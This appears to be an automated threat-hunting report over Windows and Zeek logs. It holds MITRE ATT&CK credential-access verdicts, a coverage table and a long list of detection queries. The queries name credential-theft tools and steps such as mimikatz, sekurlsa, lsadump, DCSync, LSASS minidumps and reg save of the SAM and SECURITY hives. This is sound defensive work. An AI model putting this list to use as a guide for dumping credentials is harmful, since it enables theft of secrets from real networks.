| T1558 Steal or Forge Kerberos Tickets | suspicious | Credential access is real (PowerShell/wsmprovhost opening lsass.exe with 0x1fffff/0x1f3fff on scranton and nashua, Get-PrivateKeys .pfx export by pbeesly), but no Kerberos ticket theft or forging artefact was found. |
| T1558.001 Golden Ticket | not_observed | krbtgt 4769 requests are ordinary renewable TGT renewals (TicketOptions 0x60810010, AES 0x12, status 0x0); no golden-ticket tooling or anomalous privileged logons. |
| T1558.002 Silver Ticket | not_observed | Service tickets are KDC-issued (4769, status 0x0) for machine accounts from 10.0.1.4/10.0.1.6, matching the observed WinRM/PSEXEC movement; no forged service-ticket indicators. |
| T1558.003 Kerberoasting | not_observed | All 28 TGS requests use AES 0x12 (no RC4 0x17), no SPN request burst, and no Kerberoast/Rubeus strings in PowerShell script blocks. |
| T1558.004 AS-REP Roasting | not_observed | No AS-REP/GetNPUsers/DontRequirePreAuth strings in PowerShell and no Kerberos pre-auth failure burst in the security log. |
| T1606 Forge Web Credentials | not_observed | No cookie or SAML token forgery artifacts in any dataset. Zeek window (2020-04-30) does not overlap the Windows window and shows only ordinary ssl/http/kerberos traffic; no PowerShell script block or process command line… |
| T1606.001 Web Cookies | not_observed | No browser cookie store was read, created or tampered with; the only cookie-path file creation is a benign LocalService INetCookies path written by svchost.exe on scranton. The malicious activity on scranton is LSASS cre… |
| T1606.002 SAML Tokens | not_observed | No SAML assertion/token forging observed: no SAML/Assertion/NotOnOrAfter script blocks, no saml/adfs/token HTTP URLs in Zeek, no token-minting tooling. Certificate private keys were exported to .pfx on scranton (Get-Priv… |
| T1621 Multi-Factor Authentication Request Generatio… | not_observed | No MFA/2FA/authenticator push or prompt-generation activity in any dataset. The single hit set (C355, 85 events) is WMI 5857/5858 provider-start and RSOP DeleteInstance noise under SYSTEM/NETWORK SERVICE; windows.securit… |
| T1649 Steal or Forge Authentication Certificates | malicious | Certificates exported for theft. |

## Coverage

Cells: number of hits of the planned checks, `n/a` (reason in report.json), or GAP.

| Technique | windows.other | windows.powershell | windows.security | windows.sysmon | zeek |
|---|---|---|---|---|---|
| T1003 OS Credential Dumping | 0 hits | 0 hits | 11437 hits | 39730 hits | n/a |
| T1003.001 LSASS Memory | 0 hits | 0 hits | 947 hits | 981 hits | n/a |
| T1003.002 Security Account Manager | 0 hits | 2 hits | 16 hits | 10 hits | n/a |
| T1003.003 NTDS | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1003.004 LSA Secrets | 0 hits | 0 hits | 0 hits | 327 hits | n/a |
| T1003.005 Cached Domain Credentials | 0 hits | 0 hits | 0 hits | 330 hits | n/a |
| T1003.006 DCSync | 90 hits | 0 hits | 21 hits | 0 hits | 9 hits |
| T1040 Network Sniffing | 5 hits | 0 hits | 460 hits | 0 hits | 0 hits |
| T1056 Input Capture | 90 hits | 0 hits | 21834 hits | 39609 hits | 0 hits |
| T1056.001 Keylogging | 5 hits | 0 hits | 10990 hits | 39779 hits | 0 hits |
| T1056.002 GUI Input Capture | 5 hits | 414 hits | 460 hits | 450 hits | 0 hits |
| T1056.003 Web Portal Capture | 5 hits | 0 hits | 5337 hits | 1649 hits | 0 hits |
| T1056.004 Credential API Hooking | 0 hits | 0 hits | 13 hits | 59963 hits | n/a |
| T1110 Brute Force | 2 hits | 0 hits | 0 hits | 30 hits | n/a |
| T1110.001 Password Guessing | 2 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1110.002 Password Cracking | 1 hits | 0 hits | 10977 hits | 346 hits | n/a |
| T1110.003 Password Spraying | 7 hits | 0 hits | 15 hits | 1 hits | n/a |
| T1110.004 Credential Stuffing | 4 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1111 Multi-Factor Authentication Interception | 2 hits | 0 hits | 312 hits | 39294 hits | n/a |
| T1187 Forced Authentication | 0 hits | 0 hits | 11140 hits | 1715 hits | 86 hits |
| T1212 Exploitation for Credential Access | 0 hits | 0 hits | 70 hits | 78566 hits | 14 hits |
| T1539 Steal Web Session Cookie | 0 hits | 0 hits | 465 hits | 40933 hits | 2 hits |
| T1552 Unsecured Credentials | 0 hits | 0 hits | 460 hits | 19208 hits | 12 hits |
| T1552.001 Credentials In Files | 0 hits | 0 hits | 312 hits | 2148 hits | 12 hits |
| T1552.002 Credentials in Registry | 3 hits | 1 hits | 1000 hits | 17716 hits | n/a |
| T1552.003 Shell History | 5 hits | 1 hits | 0 hits | 15 hits | n/a |
| T1552.004 Private Keys | 0 hits | 2 hits | 0 hits | 1 hits | n/a |
| T1552.006 Group Policy Preferences | 0 hits | 32 hits | 56 hits | 22 hits | n/a |
| T1555 Credentials from Password Stores | 2 hits | 5 hits | 19 hits | 1326 hits | n/a |
| T1555.003 Credentials from Web Browsers | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1555.004 Windows Credential Manager | 2 hits | 0 hits | 0 hits | 652 hits | n/a |
| T1555.005 Password Managers | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1556 Modify Authentication Process | 0 hits | 0 hits | 0 hits | 729 hits | n/a |
| T1556.001 Domain Controller Authentication | 0 hits | 0 hits | 545 hits | 359 hits | n/a |
| T1556.002 Password Filter DLL | 10 hits | 0 hits | 0 hits | 33 hits | n/a |
| T1556.005 Reversible Encryption | 0 hits | 0 hits | 0 hits | 0 hits | n/a |
| T1556.006 Multi-Factor Authentication | 0 hits | 1 hits | 0 hits | 0 hits | n/a |
| T1556.007 Hybrid Identity | 0 hits | 0 hits | 594 hits | 20259 hits | n/a |
| T1556.008 Network Provider DLL | 4 hits | 0 hits | 36 hits | 59543 hits | n/a |
| T1557 Adversary-in-the-Middle | 2 hits | 0 hits | 21954 hits | 1310 hits | 1226 hits |
| T1557.001 Name Resolution Poisoning and SMB Relay | 2 hits | 0 hits | 23 hits | 1310 hits | 53 hits |
| T1557.002 ARP Cache Poisoning | 2 hits | 0 hits | 10977 hits | 1310 hits | 1226 hits |
| T1557.003 DHCP Spoofing | 216 hits | 0 hits | 0 hits | 1229 hits | 2140 hits |
| T1558 Steal or Forge Kerberos Tickets | 9 hits | 0 hits | 745 hits | 39609 hits | 35 hits |
| T1558.001 Golden Ticket | 216 hits | 0 hits | 268 hits | 39283 hits | 35 hits |
| T1558.002 Silver Ticket | 9 hits | 0 hits | 268 hits | 326 hits | 35 hits |
| T1558.003 Kerberoasting | 216 hits | 0 hits | 368 hits | 39283 hits | 35 hits |
| T1558.004 AS-REP Roasting | 216 hits | 0 hits | 42 hits | 447 hits | 35 hits |
| T1606 Forge Web Credentials | 90 hits | 0 hits | 312 hits | 326 hits | 475 hits |
| T1606.001 Web Cookies | 9 hits | 0 hits | 312 hits | 1 hits | 62 hits |
| T1606.002 SAML Tokens | 90 hits | 0 hits | 312 hits | 0 hits | 0 hits |
| T1621 Multi-Factor Authentication Request Generatio… | 85 hits | 0 hits | 0 hits | 0 hits | 0 hits |
| T1649 Steal or Forge Authentication Certificates | 90 hits | 0 hits | 50 hits | 1133 hits | 378 hits |

Cells: 265, gaps: 0.

## Queries

Every MCP tool call of this run (1348), in order (source: mcp_audit.jsonl written by the MCP server).

| Query | Phase | Tool | Arguments | Hits / rows | Cited by |
|---|---|---|---|---|---|
| q-ac8835b9b4 | scope | list_data_sources | {} | None |  |
| q-8a8ec49be6 | scope | get_registry | {} | None |  |
| q-415cb25952 | scope | get_fields | {"dataset": "windows.other", "prefix": ""} | None |  |
| q-eb791b7f50 | scope | get_fields | {"dataset": "windows.powershell", "prefix": ""} | None |  |
| q-1fe3bd47ad | scope | get_fields | {"dataset": "windows.security", "prefix": ""} | None |  |
| q-e5bf46f6b2 | scope | get_fields | {"dataset": "windows.sysmon", "prefix": ""} | None |  |
| q-a48c77bb34 | scope | get_fields | {"dataset": "zeek", "prefix": ""} | None |  |
| q-84e8b029ea | check C001 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-bb8df75629 | check C002 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-bdad4e47ab | check C003 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:(4656 OR 4663 OR 4670)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-20154ff6ed | check C004 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 460 |  |
| q-7df91ed831 | check C005 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*lsass* OR powershell.script_block_text:*mimikatz* OR powershell.script_block_text:*sekurlsa* OR powershell.script_block_text:*DumpCreds*)", "time_from": null, "time_… | 0 |  |
| q-e6564b9afa | check C006 | search | {"dataset": "windows.other", "query": "message:(*lsass* OR *mimikatz* OR *sekurlsa* OR *procdump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "p… | 0 |  |
| q-52eece0b00 | check C007 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-dcff32282a | check C008 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-eed4ad22e3 | check C009 | aggregate | {"dataset": "windows.sysmon", "field": "win.SourceImage", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-cc0bc72605 | check C010 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*lsass* OR file.path:*.dmp)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pro… | 2 | F01 |
| q-1ae9efabba | check C011 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*comsvcs* OR process.command_line:*MiniDump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 1 |  |
| q-5760c08cfa | check C012 | search | {"dataset": "windows.sysmon", "query": "event.code:(13 OR 14) AND registry.path:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 0 |  |
| q-046aa9a79f | check C013 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4673", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 934 |  |
| q-44872fff13 | check C014 | search | {"dataset": "windows.security", "query": "event.code:4656 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command… | 13 |  |
| q-f0378d3187 | check C015 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*lsass* OR powershell.script_block_text:*MiniDump* OR powershell.script_block_text:*Invoke-Mimikatz*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "… | 0 |  |
| q-a0840597c7 | check C016 | search | {"dataset": "windows.other", "query": "message:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 0 |  |
| q-fe1c511f75 | check C017 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*SAM* OR file.path:*SECURITY* OR file.path:*SYSTEM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "… | 3 | F02 |
| q-4032433617 | check C018 | search | {"dataset": "windows.sysmon", "query": "event.code:(13 OR 14) AND (registry.path:*SAM* OR registry.path:*SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "proces… | 7 | F03 |
| q-603c6fb164 | check C019 | search | {"dataset": "windows.sysmon", "query": "event.code:2 AND (process.command_line:*SAM* OR process.command_line:*reg*save*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-73426f4834 | check C020 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*reg save* OR process.command_line:*save*hklm* OR process.command_line:*SAM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 0 |  |
| q-4f886be1bf | check C021 | aggregate | {"dataset": "windows.security", "field": "process.command_line", "query": "event.code:4688 AND (process.command_line:*reg* OR process.command_line:*save*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 6 |  |
| q-7975cc699e | check C022 | search | {"dataset": "windows.security", "query": "event.code:(4656 OR 4663) AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name",… | 10 |  |
| q-8ac79ed7f5 | check C023 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*SAM* OR powershell.script_block_text:*reg save* OR powershell.script_block_text:*hive*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "… | 2 |  |
| q-f6fd90346e | check C024 | search | {"dataset": "windows.other", "query": "message:(*SAM* OR *SECURITY hive* OR *reg save*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 0 |  |
| q-42459993c1 | check C025 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*ntds* OR file.path:*NTDS*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pro… | 0 |  |
| q-b38df52476 | check C026 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*ntds* OR process.command_line:*vssadmin* OR process.command_line:*ntdsutil* OR process.command_line:*diskshadow*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "ho… | 0 |  |
| q-8f0842f38b | check C027 | search | {"dataset": "windows.sysmon", "query": "event.code:2 AND file.path:*ntds*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 0 |  |
| q-89658fbd86 | check C028 | aggregate | {"dataset": "windows.security", "field": "process.command_line", "query": "event.code:4688 AND (process.command_line:*ntds* OR process.command_line:*vssadmin* OR process.command_line:*diskshadow*)", "time_from": null, "time_to": null, "size": 50, "sub_field": … | 0 |  |
| q-77a4244467 | check C029 | search | {"dataset": "windows.other", "query": "message:(*shadow* OR *VSS* OR *ntds*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-400a02ab90 | check C030 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*ntds* OR powershell.script_block_text:*diskshadow* OR powershell.script_block_text:*vssadmin*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.n… | 0 |  |
| q-3b3debd519 | check C031 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-7dab2dcb31 | check C032 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*secrets* OR process.command_line:*lsadump* OR process.command_line:*reg save*HKLM\\\\SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observe… | 0 |  |
| q-72e69453e0 | check C033 | search | {"dataset": "windows.sysmon", "query": "event.code:7 AND win.ImageLoaded:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 1 |  |
| q-88490b7ee2 | check C034 | search | {"dataset": "windows.security", "query": "event.code:(4656 OR 4663 OR 4670) AND win.ObjectName:*SECURITY*Policy*Secrets*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-ae56e85d00 | check C035 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:(4656 OR 4663 OR 4670) AND win.ObjectName:*Secrets*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-6405bde4da | check C036 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Secrets* OR powershell.script_block_text:*lsadump* OR powershell.script_block_text:*LSA*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name",… | 0 |  |
| q-ff7ec7cb7f | check C037 | search | {"dataset": "windows.other", "query": "message:(*Secrets* OR *LSA* OR *lsadump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 0 |  |
| q-cdae9f727b | check C038 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_li… | 326 |  |
| q-ba01327c6c | check C039 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*cache* OR process.command_line:*DCC2* OR process.command_line:*mscache* OR process.command_line:*cachedump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.na… | 4 |  |
| q-ce015f9ed2 | check C040 | search | {"dataset": "windows.security", "query": "event.code:(4656 OR 4663 OR 4670) AND (win.ObjectName:*Cache* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "u… | 0 |  |
| q-15852abd78 | check C041 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:(4656 OR 4663 OR 4670) AND win.ObjectName:*Cache*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-00bb042dfc | check C042 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*cache* OR powershell.script_block_text:*DCC2* OR powershell.script_block_text:*mscache*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", … | 0 |  |
| q-0066360708 | check C043 | search | {"dataset": "windows.other", "query": "message:(*cached*credential* OR *mscache* OR *DCC2*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-ba13f63aeb | check C044 | count | {"dataset": "windows.security", "query": "event.code:4662", "time_from": null, "time_to": null} | 7 |  |
| q-38efa21250 | check C045 | aggregate | {"dataset": "windows.security", "field": "win.AccessMask", "query": "event.code:4662", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 7 |  |
| q-7bec5a777e | check C046 | aggregate | {"dataset": "windows.security", "field": "win.SubjectUserName", "query": "event.code:4662", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 7 |  |
| q-4135e69542 | check C047 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*drsuapi* OR process.command_line:*lsadump* OR process.command_line:*dcsync*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 0 |  |
| q-c31d761a9f | check C048 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*DCSync* OR powershell.script_block_text:*lsadump* OR powershell.script_block_text:*drsuapi*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.nam… | 0 |  |
| q-983d3ba028 | check C049 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5858 OR event.code:5857", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-3bea889c9e | check C050 | search | {"dataset": "zeek", "query": "event.action:dce_rpc AND (zeek.operation:*DRSUAPI* OR zeek.endpoint:*drsuapi* OR zeek.named_pipe:*drsuapi*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code"… | 9 |  |
| q-19fb9b10bf | check C051 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-8d811e20c9 | check C052 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*pcap* OR process.command_line:*sniff* OR process.command_line:*promisc*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.da… | 0 |  |
| q-ac1e7225a6 | check C053 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-1919704185 | check C054 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*tcpdump* OR process.executable:*windump* OR process.executable:*wireshark* OR process.executable:*rawcap* OR process.executable:*npcap*)", "time_from": null, "time_to": null, "fields… | 0 |  |
| q-8c62fa0318 | check C055 | search | {"dataset": "windows.sysmon", "query": "event.code:6 AND (win.Image:*npcap* OR win.Image:*pcap* OR win.Image:*winpcap*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 0 |  |
| q-e0f57d26ef | check C056 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*pcap* OR powershell.script_block_text:*sniff* OR powershell.script_block_text:*promiscuous*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.nam… | 0 |  |
| q-57f7d26550 | check C057 | search | {"dataset": "zeek", "query": "event.action:conn AND network.transport:icmp", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "s… | 0 |  |
| q-cb8e478642 | check C058 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-fd6989e7e3 | check C059 | aggregate | {"dataset": "windows.security", "field": "win.AccessMask", "query": "event.code:4656 OR event.code:4663", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10834 |  |
| q-1584b7ee1c | check C060 | search | {"dataset": "windows.security", "query": "event.code:4656 AND (win.ObjectName:*lsass* OR win.ObjectName:*credential* OR win.ObjectName:*SAM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.c… | 23 |  |
| q-f6485e38d7 | check C061 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-dc912b2ae0 | check C062 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-05bbae6d82 | check C063 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1010 OR win.GrantedAccess:0x1410 OR win.GrantedAccess:0x1438 OR win.GrantedAccess:0x143a)", "time_from": null, "time_to": null, "fields": ["@timestamp", … | 0 |  |
| q-c4c52e3444 | check C064 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Get-Credential* OR powershell.script_block_text:*CredentialManager* OR powershell.script_block_text:*keylog*)", "time_from": null, "time_to": null, "fields": ["@time… | 0 |  |
| q-2b02545953 | check C065 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5858 OR event.code:5857", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-cb5f9fb878 | check C066 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:POST", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-dc2262d5a8 | check C067 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-b1d40d1587 | check C068 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*winlogon* OR win.TargetImage:*explorer*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event… | 470 | F10 |
| q-27890fb8ea | check C069 | search | {"dataset": "windows.sysmon", "query": "event.code:13 AND (registry.path:*Keyboard* OR registry.path:*keylog* OR registry.path:*Scancode*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code… | 26 |  |
| q-de513e1767 | check C070 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*keylog* OR process.command_line:*GetAsyncKeyState* OR process.command_line:*SetWindowsHookEx*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer… | 0 |  |
| q-cb52f2d2b6 | check C071 | aggregate | {"dataset": "windows.security", "field": "win.ObjectType", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-36226e9d4b | check C072 | search | {"dataset": "windows.security", "query": "event.code:4656 AND (win.ObjectName:*lsass* OR win.ObjectName:*winlogon*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "proces… | 13 |  |
| q-3facd145ad | check C073 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-70f276b6dc | check C074 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*keylog* OR powershell.script_block_text:*GetAsyncKeyState* OR powershell.script_block_text:*SetWindowsHookEx*)", "time_from": null, "time_to": null, "fields": ["@tim… | 0 |  |
| q-37f675fded | check C075 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:POST", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-b999a3b615 | check C076 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Credential* OR powershell.script_block_text:*Prompt* OR powershell.script_block_text:*Read-Host*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "hos… | 0 |  |
| q-4d01a7b306 | check C077 | aggregate | {"dataset": "windows.powershell", "field": "win.ScriptBlockId", "query": "event.code:4104", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 414 |  |
| q-f18359428d | check C078 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*Credential* OR process.command_line:*prompt* OR process.command_line:*consent*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.… | 3 |  |
| q-f9dcde7884 | check C079 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 447 |  |
| q-608ab18490 | check C080 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*Credential* OR process.command_line:*prompt*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user… | 0 |  |
| q-01120ac495 | check C081 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-ee564c3248 | check C082 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-8aeabb2ca0 | check C083 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:POST", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-6567845b84 | check C084 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*login* OR file.path:*portal* OR file.path:*wwwroot* OR file.path:*inetpub*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "eve… | 0 |  |
| q-9717636bee | check C085 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 1649 |  |
| q-e89267d765 | check C086 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*iis* OR process.command_line:*w3wp* OR process.command_line:*wwwroot*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset",… | 0 |  |
